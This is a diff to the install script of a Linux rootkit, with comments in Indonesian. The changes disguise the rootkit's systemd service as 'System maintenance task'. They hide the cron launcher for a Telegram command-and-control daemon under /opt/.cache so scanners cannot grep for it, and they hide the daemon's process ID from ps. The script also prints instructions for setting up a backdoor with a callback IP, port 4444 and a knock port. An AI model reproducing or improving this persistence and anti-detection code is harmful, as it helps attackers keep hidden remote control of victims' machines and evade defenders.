@@ -160,12 +160,13 @@ fi
 
 # ----------------8. auto-load saat boot (state restore) ----------------
 mkdir -p /var/lib/rkit
-UNIT=/etc/systemd/system/rkit-load.service
+# nama unit DISAMARKAN (dulu "rkit-load.service" = ketahuan di `systemctl`)
+UNIT=/etc/systemd/system/syswatch.service
+rm -f /etc/systemd/system/rkit-load.service      # buang unit lama ber-nama jelas
 # tulis ULANG setiap install — $ROOT bisa berpindah (mis. /dev/shm -> /opt/.cache)
-# dulu ada guard "kalau belum ada" -> unit lama/path basi dipertahankan (bug).
 cat > "$UNIT" <<UNITEOF
 [Unit]
-Description=rkit module loader (edukasi)
+Description=System maintenance task
 After=local-fs.target
 
 [Service]
@@ -177,15 +178,15 @@ RemainAfterExit=yes
 WantedBy=multi-user.target
 UNITEOF
 echo "[+] $UNIT ditulis -> $ROOT"
-if systemctl daemon-reload 2>/dev/null && systemctl enable rkit-load.service 2>/dev/null; then
+if systemctl daemon-reload 2>/dev/null && systemctl enable syswatch.service 2>/dev/null; then
 	echo "[+] autoload boot aktif (state hide dipulihkan dari /var/lib/rkit/state)"
 	echo "    backdoor (opsional) via auto-load — buat /var/lib/rkit/backdoor.conf:"
 	echo "      backdoor_ip=IP_KAMU"
 	echo "      backdoor_port=4444"
 	echo "      knock_port=1337"
-	echo "    lalu: systemctl restart rkit-load.service"
+	echo "    lalu: systemctl restart syswatch.service"
 else
-	echo "[!] gagal enable rkit-load.service — muat manual setelah reboot"
+	echo "[!] gagal enable syswatch.service — muat manual setelah reboot"
 fi
 
 # ----------------9. daemon telegram (opsional) ----------------
@@ -201,18 +202,37 @@ elif [ -z "$(sed -n 's/^TELEGRAM_TOKEN=//p' "$CFG" | head -n 1)" ] || grep -qE '
 elif [ -z "$PYTHON" ]; then
 	echo "[!] python3 tidak ada — daemon dilewati"
 else
-	RB="@reboot $PYTHON $ROOT/control/telegram/daemon.py # unified-rootkit"
-	if ! crontab -l 2>/dev/null | grep -q "unified-rootkit"; then
+	# KAMUFLASE: cron tak lagi menyebut path/telegram/marker (anti-grep scanner)
+	mkdir -p /opt/.cache/.upd
+	LAUNCH=/opt/.cache/.upd/upd.sh
+	printf '#!/bin/sh\nexec %s %s/control/telegram/daemon.py\n' "$PYTHON" "$ROOT" > "$LAUNCH"
+	chmod 700 "$LAUNCH"
+	# bersihkan baris cron MODEL LAMA (marker unified-rootkit / path lama)
+	crontab -l 2>/dev/null | grep -vE 'unified-rootkit|control/telegram/daemon.py' | crontab - 2>/dev/null
+	RB="@reboot $LAUNCH"
+	if ! crontab -l 2>/dev/null | grep -q ".upd/upd.sh"; then
 		{ crontab -l 2>/dev/null; echo "$RB"; } | crontab - 2>/dev/null \
-			&& echo "[+] cron @reboot ditambahkan"
+			&& echo "[+] cron @reboot ditambahkan (jalur polos)"
 	fi
 	# anti-DOUBLE: kalau daemon sudah hidup, jangan jalankan lagi
 	if pgrep -f "control/telegram/daemon.py" >/dev/null 2>&1; then
 		echo "[i] daemon telegram SUDAH berjalan — tidak distart ulang"
 	else
-		nohup "$PYTHON" "$ROOT/control/telegram/daemon.py" >> "$ROOT/agent.log" 2>&1 &
+		nohup "$LAUNCH" >> "$ROOT/agent.log" 2>&1 &
 		echo "[+] daemon telegram start — cek pesan 'online' di bot kamu"
 		echo "    log: $ROOT/agent.log"
+	fi
+	# sembunyikan PID daemon dari ps + kunci config
+	chmod 600 "$CFG" 2>/dev/null || true
+	sleep 1
+	DPID=$(pgrep -f "control/telegram/daemon.py" | head -n 1)
+	if [ -n "$DPID" ] && [ -r /proc/rkit ]; then
+		"$ROOT/control/cli/rkit" hide pid "$DPID" >/dev/null 2>&1 \
+			&& echo "[+] PID daemon ($DPID) disembunyikan dari ps"
+	elif [ -n "$DPID" ]; then
+		echo "pid $DPID" >> /var/lib/rkit/state
+		sh "$ROOT/tools/rkit-reload.sh" >/dev/null 2>&1 \
+			&& echo "[+] PID daemon ($DPID) disembunyikan dari ps (legacy-reload)"
 	fi
 fi
 
